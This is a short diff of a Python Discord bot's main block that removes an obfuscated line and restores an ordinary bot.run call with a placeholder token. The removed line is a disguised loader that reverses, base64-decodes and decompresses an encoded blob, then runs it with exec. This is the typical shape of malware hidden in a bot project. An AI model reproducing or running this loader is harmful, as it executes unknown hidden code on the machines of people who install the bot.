@@ -78,4 +78,4 @@ def run_api():
 
 if __name__ == '__main__':
     threading.Thread(target=run_api).start()
-   _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gaZoxRAQg0QVDCwQftqskCPfnj29cNNbNM2SH93mMdPoYNpgyMIJDyKriy39wMTTXj1T9jzddT2TjCNH/NKtc91E3c33S81BPNKsa90kQDyD10NryKR/iyLxJe'))
+    bot.run("YOUR_DISCORD_TOKEN")
